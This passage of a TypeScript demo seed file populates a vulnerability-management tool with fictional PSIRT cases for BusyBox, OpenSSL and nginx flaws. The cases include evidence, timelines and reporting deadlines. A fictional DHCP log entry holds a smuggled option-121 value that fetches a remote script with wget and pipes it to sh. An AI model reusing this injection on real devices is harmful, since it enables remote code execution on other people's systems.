    title: 'BusyBox udhcpc injection -- RemoteOps Controller and SecureEdge', vulnKey: 'v.busybox', productIds: ['PRD-ROC', 'PRD-SEG'], ownerId: 'u-analyst', createdBy: 'u-analyst',
    collaboratorIds: ['u-eng'], tags: ['ot', 'dhcp', 'critical-infrastructure'], summary: 'Rogue DHCP on plant networks. Controllers run udhcpc; gateways use systemd-networkd.',
  })
  s.event('c2.detection', T2 + 12 * M, {
    caseKey: 'c2', type: 'DETECTION', occurredAt: T2, timezone: 'UTC', actorId: 'u-analyst',
    source: 'ICS advisory subscription (mail server message trace)', sourceKind: 'system_of_record', evidenceKeys: ['c2.advisory'],
  })
  s.evidence('c2.ticket', T2 + 80 * M, {
    caseKey: 'c2', type: 'TICKET', title: 'PSIRT-2266 confirmation record', description: 'Controllers ship busybox 1.35.0 with udhcpc active.', source: 'PSIRT tracker',
    sourceCreatedAt: T2 + 90 * M, ownerId: 'u-lead', fileName: 'PSIRT-2266.txt',
    content: `PSIRT-2266  busybox udhcpc option 121\n${iso(T2 + 90 * M)}  state Triage -> Confirmed by jonas.weber\n`,
  })
  s.event('c2.va', T2 + 93 * M, {
    caseKey: 'c2', type: 'VULNERABILITY_AWARENESS', occurredAt: T2 + 90 * M, timezone: 'Europe/Berlin', actorId: 'u-lead',
    source: 'PSIRT tracker: PSIRT-2266 state Triage -> Confirmed', sourceKind: 'system_of_record', evidenceKeys: ['c2.ticket'], criterionId: 'AC-01',
  })
  s.evidence('c2.ti', T2 + 110 * M, {
    caseKey: 'c2', type: 'THREAT_INTELLIGENCE', title: 'CERT update: exploitation confirmed on plant networks', description: 'Update to ICSA-26-272-01.',
    source: 'National CERT (TLP:AMBER)', sourceCreatedAt: T2 + 100 * M, ownerId: 'u-analyst', fileName: 'ICSA-26-272-01-update1.txt',
    content: `ICSA-26-272-01 UPDATE 1 (fictional, demo data)  TLP:AMBER\nExploitation confirmed at two plant operators. Rogue DHCP servers observed since ${iso(T2 - 3 * D).slice(0, 10)}.\n`,
  })
  s.evidence('c2.log', T2 + 112 * M, {
    caseKey: 'c2', type: 'LOG', title: 'Customer DHCP logs: crafted option 121 to RemoteOps controllers', description: 'Plant operator DHCP and controller logs.',
    source: 'Customer-provided logs (plant operator)', sourceCreatedAt: T2 + 60 * M, ownerId: 'u-analyst', fileName: 'plant-dhcp.log',
    content: `${iso(T2 - 4 * H)} dhcpd[rogue] OFFER 10.20.4.17 to roc-ctrl-04 opt121="0.0.0.0/0,10.20.4.1;wget -qO- http://198.51.100.9/x|sh"\n${iso(T2 - 4 * H + 30000)} roc-ctrl-04 udhcpc: bound 10.20.4.17; hook script exec\n(fictional, demo data)\n`,
  })
  s.exploitation(T2 + 114 * M, 'v.busybox', 'CONFIRMED', 'u-mgr', 'c2')
  s.event('c2.occurrence', T2 + 116 * M, {
    caseKey: 'c2', type: 'OCCURRENCE', occurredAt: T2 - 3 * D, timezone: 'UTC', actorId: 'u-analyst',
    source: 'CERT update 1, rogue DHCP observed since (day precision)', sourceKind: 'external_document', evidenceKeys: ['c2.ti'],
  })
  s.event('c2.ea', T2 + 118 * M, {
    caseKey: 'c2', type: 'EXPLOITATION_AWARENESS', occurredAt: T2 + 115 * M, timezone: 'Europe/Berlin', actorId: 'u-mgr',
    source: 'Security Manager validation of CERT update and customer logs', sourceKind: 'system_of_record', evidenceKeys: ['c2.ti', 'c2.log'], criterionId: 'AC-03',
  })
  s.evidence('c2.sbom', T2 + 2.5 * H, {
    caseKey: 'c2', type: 'SBOM', title: 'SBOM excerpt: RemoteOps Controller 2.8.0 (busybox)', description: 'busybox entry with applet list.', source: 'Build pipeline SBOM export',
    sourceCreatedAt: T2 + 2.4 * H, ownerId: 'u-eng', fileName: 'sbom-roc-busybox.json',
    content: JSON.stringify({ bomFormat: 'CycloneDX', specVersion: '1.5', note: 'fictional demo excerpt', components: [{ name: 'busybox', version: '1.35.0', purl: 'pkg:generic/busybox@1.35.0', properties: [{ name: 'applets', value: 'ash,udhcpc,ifconfig,route,...' }] }] }, null, 2),
  })
  s.determination('c2.det.roc', T - 19 * H, {
    caseKey: 'c2', productId: 'PRD-ROC', analystId: 'u-eng', confidence: 'HIGH',
    rationale: 'udhcpc is the DHCP client on the plant-network interface. Customer logs show exploitation against shipped controllers.',
    answers: {
      component_present: exposedYes('busybox 1.35.0.', ['c2.sbom']),
      vulnerable_version: exposedYes('1.35.0 < 1.36.2.', ['c2.sbom']),
      functionality_enabled: exposedYes('udhcpc applet built and enabled.', ['c2.sbom']),
      feature_reachable: exposedYes('DHCP on the plant interface by default.'),
      exploit_path: exposedYes('Any host on the plant network can answer DHCP.'),
      configuration_mitigates: ['NO', 'DHCP is the shipped default.'],
      compensating_control: ['YES', 'Operator guidance: static addressing on OT interfaces.'],
      exploitation_demonstrated: ['YES', 'Customer DHCP and controller logs.', ['c2.log']],
      product_validation: ['YES', 'Reproduced with a rogue DHCP server in the lab.', ['c2.log']],
    },
  })
  s.evidence('c2.build-seg', T - 18.5 * H, {
    caseKey: 'c2', type: 'CONFIGURATION', title: 'SecureEdge busybox build config: udhcpc not built', description: 'busybox .config from the 4.2.1 build.',
    source: 'Build recipes (gateway 4.2.1)', sourceCreatedAt: T - 90 * D, ownerId: 'u-analyst', fileName: 'seg-busybox.config',
    content: '# busybox 1.36.1 .config for SecureEdge 4.2.1 (fictional excerpt)\n# CONFIG_UDHCPC is not set\n# CONFIG_UDHCPC6 is not set\n# networking via systemd-networkd\n',
  })
  s.determination('c2.det.seg', T - 18 * H, {
    caseKey: 'c2', productId: 'PRD-SEG', analystId: 'u-analyst', confidence: 'HIGH',
    rationale: 'SecureEdge builds busybox without the udhcpc applet; networking is handled by systemd-networkd. The vulnerable code is not present in the shipped build.',
    answers: {
      component_present: exposedYes('busybox 1.36.1.', ['c2.build-seg']),
      vulnerable_version: exposedYes('1.36.1 < 1.36.2.'),
      functionality_enabled: ['NO', 'CONFIG_UDHCPC is not set.', ['c2.build-seg']],
      product_validation: ['YES', 'Shipped image has no udhcpc binary or applet link.', ['c2.build-seg']],
    },
  })
  s.decision('c2.dec', T - 16 * H, {
    caseKey: 'c2', analystId: 'u-lead', outcome: 'REPORT', confidence: 'HIGH', evidenceKeys: ['c2.ti', 'c2.log'],
    exploitationBasis: 'CERT update 1 and plant operator logs showing exploitation of shipped controllers.',
    rationale: 'RemoteOps Controller is affected and actively exploited on EU plant networks; awareness is after application. SecureEdge is not affected (udhcpc not built). Report for RemoteOps Controller.',
  })
  s.report('c2.ew1', T - 15 * H, { caseKey: 'c2', kind: 'EARLY_WARNING', userId: 'u-analyst' })
  s.transition(T - 14.8 * H, 'c2.ew1', 'INTERNAL_REVIEW', 'u-analyst')
  s.review(T - 13 * H, { caseKey: 'c2', reportKey: 'c2.ew1', reviewerId: 'u-mgr', action: 'REQUEST_CHANGES', comment: 'Add the Member States list and the operator mitigation (disable DHCP on the plant interface, use static addressing).' })
  s.comment(T - 13 * H + M, { caseKey: 'c2', authorId: 'u-mgr', body: 'Returned v1.0 for changes: the Member States list and operator mitigation are missing. Clock is running.' })
  s.report('c2.ew2', T - 3 * H, { caseKey: 'c2', kind: 'EARLY_WARNING', userId: 'u-analyst' })
  s.transition(T - 2.75 * H, 'c2.ew2', 'INTERNAL_REVIEW', 'u-analyst')
  s.comment(T - 2.7 * H, { caseKey: 'c2', authorId: 'u-analyst', body: `v1.1 adds the Member States list and the operator mitigation. @SecurityLead approval needed; the early warning is due at ${hm(T2 + 115 * M + 24 * H)} UTC.` })

  // ===========================================================================
  // openssl / SecureEdge -- the active clock
  // ===========================================================================
  s.vulnerability('v.openssl', T - 7.33 * H, {
    cve: 'CVE-2026-990117',
    title: 'Heap buffer over-read in X.509 policy-constraint processing',
    cwe: 'CWE-125',
    cvssScore: 9.1,
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H',
    severity: 'CRITICAL',
    description: 'Processing a certificate chain with crafted policy constraints reads past the end of a heap buffer during path validation, disclosing memory or crashing the process. Fictional vulnerability for the NEXUS demo.',
    componentId: 'CMP-OPENSSL',
    affectedVersions: '>=3.0.0 <3.0.16 || >=3.1.0 <3.1.8',
    fixedVersion: '3.0.16',
    exploitability: 'Network, unauthenticated, during the TLS handshake',
    exploitation: 'SUSPECTED',
    source: 'Upstream security advisory (fictional)',
    discoveredAt: iso(T - 9 * H),
    vendorAdvisory: 'https://advisories.example/openssl/2026-09-30',
    threatIntelReference: 'https://cert-exchange.example/bulletins/2026-0930-01',
  }, 'u-analyst')
  s.evidence('c1.siem', T - 7.16 * H, {
    caseKey: 'c1', type: 'LOG', title: 'SIEM alert TI-4471: threat-intel match on gateway TLS listeners', description: 'Alert export from the SOC SIEM.',
    source: 'Tessaline SOC SIEM', sourceCreatedAt: T - 7.23 * H, ownerId: 'u-analyst', fileName: 'siem-TI-4471.log',
    content: `${iso(T - 7.23 * H)} soc-siem alert rule=TI-MATCH-4471 severity=high (fictional, demo data)\n  indicator=x509-policy-constraint-overflow src=203.0.113.44 dst=seg-eu-0418.fleet.tessaline.example:443\n  product=SecureEdge Gateway 4.2.1 openssl=3.0.9\n`,
  })
  s.evidence('c1.advisory', T - 7.15 * H, {
    caseKey: 'c1', type: 'VENDOR_ADVISORY', title: 'Upstream advisory: X.509 policy-constraint over-read', description: 'Upstream security advisory.',
    source: 'Upstream security advisory mail', sourceCreatedAt: T - 9 * H, ownerId: 'u-analyst', fileName: 'advisory-openssl-20260930.txt',
    links: [{ targetType: 'vulnerability', key: 'v.openssl' }],
    content: 'UPSTREAM SECURITY ADVISORY (fictional, demo data)\nCVE-2026-990117  Heap buffer over-read in X.509 policy-constraint processing\nAffected: 3.0.0-3.0.15, 3.1.0-3.1.7  Fixed: 3.0.16, 3.1.8\nSeverity: critical\n',
  })
  s.openCase('c1', T - 7.17 * H, {
    title: 'OpenSSL X.509 policy over-read -- SecureEdge Gateway fleet', vulnKey: 'v.openssl', productIds: ['PRD-SEG', 'PRD-BCC'], ownerId: 'u-analyst', createdBy: 'u-analyst',
    collaboratorIds: ['u-eng', 'u-lead'], tags: ['tls', 'x509', 'internet-facing'],
    summary: 'Crafted certificate chains during the TLS handshake. SecureEdge terminates TLS with OpenSSL; BridgeCloud Console ships the library only in its base image.',
  })
  s.event('c1.detection', T - 7.13 * H, {
    caseKey: 'c1', type: 'DETECTION', occurredAt: T - 7.23 * H, timezone: 'UTC', actorId: 'u-analyst',
    source: 'SIEM alert TI-4471 (Tessaline SOC SIEM, UTC)', sourceKind: 'system_of_record', evidenceKeys: ['c1.siem'],
  })
  s.comment(T - 7.08 * H, { caseKey: 'c1', authorId: 'u-analyst', body: 'Correlated SIEM alert TI-4471 with the upstream advisory. @PSIRT please confirm fleet exposure: SecureEdge 4.2.1 ships openssl 3.0.9.' })
  s.evidence('c1.ticket', T - 6.75 * H, {
    caseKey: 'c1', type: 'TICKET', title: 'PSIRT-2291 confirmation record', description: 'Confirmed against the SecureEdge SBOM.', source: 'PSIRT tracker',
    sourceCreatedAt: T - 6.67 * H, ownerId: 'u-lead', fileName: 'PSIRT-2291.txt',
    content: `PSIRT-2291  openssl X.509 policy over-read\n${iso(T - 7.17 * H)}  created by priya.raman\n${iso(T - 6.67 * H)}  state Triage -> Confirmed by jonas.weber ("SEG 4.2.1: openssl 3.0.9, in range")\n`,
  })
  s.event('c1.va', T - 6.63 * H, {
    caseKey: 'c1', type: 'VULNERABILITY_AWARENESS', occurredAt: T - 6.67 * H, timezone: 'Europe/Berlin', actorId: 'u-lead',
    source: 'PSIRT tracker: PSIRT-2291 state Triage -> Confirmed (tracker server clock)', sourceKind: 'system_of_record', evidenceKeys: ['c1.ticket', 'c1.advisory'], criterionId: 'AC-01',
  })
  s.markReviewed(T - 6.6 * H, 'u-lead', 'c1')
  s.evidence('c1.soc', T - 6.42 * H, {
    caseKey: 'c1', type: 'EXPLOIT_EVIDENCE', title: 'SOC analysis: exploitation against a customer gateway', description: 'Crash dumps and TLS logs from a fleet gateway.',
    source: 'Tessaline SOC case SOC-5530', sourceCreatedAt: T - 6.45 * H, ownerId: 'u-mgr', fileName: 'SOC-5530-analysis.txt',
    content: `SOC-5530 (fictional, demo data)\nGateway seg-eu-0418 (SecureEdge 4.2.1): 41 handshakes from 203.0.113.44 presenting chains with\n4,096 nested policy constraints; tls-proxy crashed 6 times; one core dump shows heap bytes in the alert payload.\nAssessment: exploitation by a malicious actor, not research traffic (no disclosure contact, payload exfiltration).\n`,
  })
  s.evidence('c1.cert', T - 6.4 * H, {
    caseKey: 'c1', type: 'THREAT_INTELLIGENCE', title: 'Partner CERT bulletin 2026-0930-01', description: 'In-the-wild exploitation of the X.509 over-read.',
    source: 'Partner CERT exchange (TLP:AMBER)', sourceCreatedAt: T - 8 * H, ownerId: 'u-analyst', fileName: 'cert-bulletin-2026-0930-01.txt',
    content: `PARTNER CERT BULLETIN 2026-0930-01 (fictional, demo data)  TLP:AMBER\nCVE-2026-990117 exploited against internet-facing TLS endpoints.\nFirst observed: ${iso(T - 31 * H)}\n`,
  })
  s.exploitation(T - 6.33 * H, 'v.openssl', 'CONFIRMED', 'u-mgr', 'c1')
  s.event('c1.occurrence', T - 6.32 * H, {
    caseKey: 'c1', type: 'OCCURRENCE', occurredAt: T - 31 * H, timezone: 'UTC', actorId: 'u-analyst',
    source: 'Partner CERT bulletin 2026-0930-01, first observed exploitation', sourceKind: 'external_document', evidenceKeys: ['c1.cert'],
  })
  s.event('c1.ea', T - 6.25 * H, {
    caseKey: 'c1', type: 'EXPLOITATION_AWARENESS', occurredAt: T - 6.3 * H, timezone: 'Europe/Berlin', actorId: 'u-mgr',
    source: 'Security Manager validation of SOC-5530 (sign-off in SOC case system)', sourceKind: 'system_of_record', evidenceKeys: ['c1.soc', 'c1.cert'], criterionId: 'AC-03',
  })
  s.comment(T - 6.2 * H, { caseKey: 'c1', authorId: 'u-mgr', body: '@PSIRT exploitation validated from SOC-5530. Exploitation awareness is recorded and the clock is running: the early warning is due within 24 hours.' })
  s.evidence('c1.customer', T - 5.8 * H, {
    caseKey: 'c1', type: 'CUSTOMER_COMMUNICATION', classification: 'restricted', title: 'Customer advisory draft (privileged)', description: 'Draft prepared with counsel.',
    source: 'Legal / customer success', sourceCreatedAt: T - 5.9 * H, ownerId: 'u-legal', fileName: 'customer-advisory-draft.txt',
    content: 'PRIVILEGED AND CONFIDENTIAL (fictional, demo data)\nDraft advisory to SecureEdge customers: restrict management TLS listeners to trusted networks until 4.2.2.\n',
  })
  s.comment(T - 2 * H, { caseKey: 'c1', authorId: 'u-eng', body: 'Starting affectedness for BridgeCloud Console. OpenSSL there is a base-image library and the console terminates TLS in the JVM, so I expect NOT AFFECTED at step 4, pending validation.' })

  // ===========================================================================
  // openssl / SecureConnect Agent -- corrected awareness timestamp
  // ===========================================================================
  s.openCase('c10', T - 5.67 * H, {
    title: 'OpenSSL X.509 policy over-read -- SecureConnect Agent', vulnKey: 'v.openssl', productIds: ['PRD-SCA'], ownerId: 'u-analyst2', createdBy: 'u-lead',
    collaboratorIds: ['u-eng'], tags: ['tls', 'endpoint'], summary: 'Same CVE as the gateway case, separate product line. The agent validates the console certificate chain with OpenSSL 3.0.13.',
  })
  s.relation(T - 5.65 * H, { caseKey: 'c10', relatedCaseKey: 'c1', relation: 'RELATED_CVE', note: 'Same CVE; separate product-line investigation. Awareness for the agent line is tracked here.', userId: 'u-lead' })
  s.evidence('c10.ticket', T - 5.6 * H, {
    caseKey: 'c10', type: 'TICKET', title: 'PSIRT-2292 (child of PSIRT-2291): agent product line', description: 'Agent line confirmation.', source: 'PSIRT tracker',
    sourceCreatedAt: T - 5.5 * H, ownerId: 'u-lead', fileName: 'PSIRT-2292.txt',
    content: `PSIRT-2292  child of PSIRT-2291, SecureConnect Agent\n${iso(T - 5.5 * H)}  state Triage -> Confirmed by jonas.weber ("agent 7.1.0: openssl 3.0.13, in range")\n`,
  })
  s.event('c10.detection', T - 5.58 * H, {
    caseKey: 'c10', type: 'DETECTION', occurredAt: T - 5.75 * H, timezone: 'UTC', actorId: 'u-lead',
    source: 'Internal cross-reference from the gateway case (PSIRT tracker)', sourceKind: 'system_of_record', evidenceKeys: ['c10.ticket'],
  })
  s.event('c10.va', T - 5.47 * H, {
    caseKey: 'c10', type: 'VULNERABILITY_AWARENESS', occurredAt: T - 5.5 * H, timezone: 'Europe/Berlin', actorId: 'u-lead',
    source: 'PSIRT tracker: PSIRT-2292 state Triage -> Confirmed', sourceKind: 'system_of_record', evidenceKeys: ['c10.ticket'], criterionId: 'AC-01',
  })
  s.evidence('c10.ir', T - 4.9 * H, {
    caseKey: 'c10', type: 'INCIDENT_RECORD', title: 'IR-0951: exploitation attempts against agents at an MSP partner', description: 'IR ticket with creation timestamp.',
    source: 'Incident response case system', sourceCreatedAt: T - 5 * H, ownerId: 'u-lead', fileName: 'IR-0951.txt',
    content: `IR-0951 (fictional, demo data)\nCreated: ${iso(T - 5 * H)} (service desk server clock, UTC)\nDisplayed to Munich staff as local time (CEST, UTC+02:00).\nFinding: agents at an MSP partner received crafted certificate chains from a spoofed console; two agent crashes.\nConfirmed exploitation: ${iso(T - 5 * H)} (IR lead)\n`,
  })
  s.event('c10.ea', T - 2.83 * H, {
    caseKey: 'c10', type: 'EXPLOITATION_AWARENESS', occurredAt: T - 3 * H, timezone: 'Europe/Berlin', actorId: 'u-lead',
    source: 'IR-0951, time entered manually from the ticket view', sourceKind: 'analyst_attestation', evidenceKeys: ['c10.ir'], criterionId: 'AC-04',
    note: 'Entered from the ticket view.',
  })
  s.determination('c10.det', T - 1.83 * H, {
    caseKey: 'c10', productId: 'PRD-SCA', analystId: 'u-eng', confidence: 'MEDIUM',
    rationale: 'The agent validates the console chain with OpenSSL 3.0.13, which is in range. Whether a network attacker can present a crafted chain before the agent\'s pin check is not yet established.',
    unresolved: 'Whether certificate pinning is evaluated before X.509 policy processing is unconfirmed.',
    nextAction: 'Confirm whether certificate pinning precedes policy processing in the agent TLS stack',
    nextActionOwnerId: 'u-eng',
    nextActionDue: T + 6 * H,
    answers: {
      component_present: exposedYes('openssl 3.0.13.'),
      vulnerable_version: exposedYes('3.0.13 < 3.0.16.'),
      functionality_enabled: exposedYes('Default verification enables policy processing.'),
      feature_reachable: exposedYes('Every console connection validates the chain.'),
      exploit_path: ['UNKNOWN', 'Depends on whether the pin check runs first.'],
    },
  })
  s.correction('c10.correction', T - 1.5 * H, {
    caseKey: 'c10', targetKey: 'c10.ea', occurredAt: T - 5 * H, timezone: 'UTC', actorId: 'u-mgr',
    source: 'IR-0951 creation timestamp (service desk server clock, UTC)', sourceKind: 'system_of_record', evidenceKeys: ['c10.ir'],
    reason: 'The original entry took the time shown in the ticket view, which is local time (CEST), and recorded it as UTC. The service desk record shows the UTC value two hours earlier. Corrected to the system-of-record value; the original entry is preserved.',
  })
  s.comment(T - 1.47 * H, { caseKey: 'c10', authorId: 'u-mgr', body: 'Corrected the exploitation-awareness timestamp. The early warning is now due two hours earlier than first shown.', relatedEventKey: 'c10.correction' })

  // ===========================================================================
  // nginx -- scanner hit only; investigating
  // ===========================================================================
  s.vulnerability('v.nginx', T - 3.42 * H, {
    cve: 'CVE-2026-990204',
    title: 'HTTP/2 CONTINUATION frame handling allows request smuggling',
    cwe: 'CWE-444',
    cvssScore: 7.5,
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N',
    severity: 'HIGH',
    description: 'Malformed CONTINUATION frame sequences desynchronise request framing between HTTP/2 and the upstream HTTP/1.1 connection. Fictional vulnerability for the NEXUS demo.',
    componentId: 'CMP-NGINX',
    affectedVersions: '>=1.23.0 <1.27.4',
    fixedVersion: '1.27.4',
    exploitability: 'Network, unauthenticated, HTTP/2 enabled',
    exploitation: 'UNKNOWN',
    source: 'Nightly SBOM scan',
    discoveredAt: iso(T - 3.67 * H),
    vendorAdvisory: 'https://advisories.example/nginx/h2-continuation',
    threatIntelReference: null,
  }, 'u-analyst')
  s.evidence('c8.scan', T - 3.32 * H, {
    caseKey: 'c8', type: 'SCANNER_RESULT', title: 'Nightly SBOM scan: nginx 1.24.0 in SecureEdge', description: 'Scanner output.', source: 'Nightly SBOM scan job (CI)',
    sourceCreatedAt: T - 3.67 * H, ownerId: 'u-analyst', fileName: 'scan-nginx.json',
    content: JSON.stringify({ job: 'SCAN-NIGHTLY', note: 'fictional demo data', finding: 'CVE-2026-990204', matches: [{ product: 'SecureEdge Gateway 4.2.1', component: 'nginx', version: '1.24.0' }] }, null, 2),
  })
  s.openCase('c8', T - 3.33 * H, {
    title: 'nginx HTTP/2 request smuggling -- SecureEdge management proxy', vulnKey: 'v.nginx', productIds: ['PRD-SEG'], ownerId: 'u-analyst', createdBy: 'u-analyst',
    tags: ['http2', 'sbom-scan'], summary: 'Scanner match only. No awareness criterion met yet.',
  })
  s.event('c8.detection', T - 3.3 * H, {
    caseKey: 'c8', type: 'DETECTION', occurredAt: T - 3.63 * H, timezone: 'UTC', actorId: 'u-analyst',
    source: 'Nightly SBOM scan job (CI server clock)', sourceKind: 'system_of_record', evidenceKeys: ['c8.scan'],
  })
}

export const DEMO_START_SEQUENCES: Record<string, number> = {
  'CASE-2026': 31,
  VUL: 11,
  EV: 0,
  CE: 0,
  DET: 0,
  DEC: 0,
  RPT: 0,
}
